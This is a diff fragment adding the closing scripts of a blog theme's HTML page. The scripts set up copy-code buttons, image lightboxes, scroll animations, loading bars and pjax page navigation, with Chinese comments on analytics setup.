+    function pjax_initCopyCode() {
+        var copyHtml = '';
+        copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+        copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+        copyHtml += '</button>';
+        $(".highlight .code pre").before(copyHtml);
+        $(".article pre code").before(copyHtml);
+        clipboard.off('success').on('success', function (e) {
+            let $btn = $(e.trigger);
+            $btn.addClass('copied');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-check-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPIED';
+            wait(function () {
+                $icon.removeClass('fa-check-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        });
+        clipboard.off('error').on('error', function (e) {
+            e.clearSelection();
+            let $btn = $(e.trigger);
+            $btn.addClass('copy-failed');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-times-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPY FAILED';
+            wait(function () {
+                $icon.removeClass('fa-times-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        })
+    }
+    $(function () {
+        pjax_initCopyCode()
+    });
+</script>
+
+
+<!-- scrollreveal -->
+
+  <script src="/static/js-css/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    function pjax_scrollrebeal() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '32px',
+        duration: '800',
+        interval: '20',
+        scale: '1',
+        easing: 'ease-out'
+      });
+    }
+
+    $(function () {
+      pjax_scrollrebeal();
+    });
+  </script>
+
+<!-- ******************************** -->
+
+<!-- fancybox -->
+<script src="/static/js-css/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+<!-- ******************************** -->
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+
+  
+    
+<script src="/js/search.js"></script>
+
+  
+
+
+
+  <script defer src="/static/js-css/busuanzi.pure.mini.js" data-pjax></script>
+
+
+
+  
+<script src="/static/js-css/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function () {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+
+  
+<script src="/static/js-css/comment_typing.js"></script>
+
+
+
+
+
+
+
+    
+      
+
+
+<script src="/static/js-css/pjax.min.js"></script>
+
+<!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <script src="/static/js-css/nprogress.min.js"></script>
+    <div id="loading-bar-wrapper"><script>NProgress.configure({parent:"#loading-bar-wrapper",trickleSpeed: 100})</script></div>
+    <script>
+      window.ShowLoading = function() {
+        NProgress.start();
+      };
+      window.HideLoading = function() {
+        NProgress.done();
+      }
+    </script>
+  
+</div>
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      $.fancybox.close();    // 关闭弹窗
+      $('.l_header .switcher .s-search').removeClass('active'); // 关闭移动端激活的搜索框
+      $('.l_header').removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      $('.wrapper').removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      $('.s-top').unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+      window.ShowLoading();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+      // 
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+
+      try{
+        pjax_fancybox();
+        
+          
+          if ('.cover') {
+            $('.cover').backstretch("resize");
+          } else {
+            $.backstretch("resize");
+          }
+        
+        
+        
+          pjax_scrollrebeal();
+        
+        
+          pjax_initCopyCode();
+        
+        
+          pjax_valine();
+        
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+      window.HideLoading();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.HideLoading();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
+  </div>
+</body>
+</html>
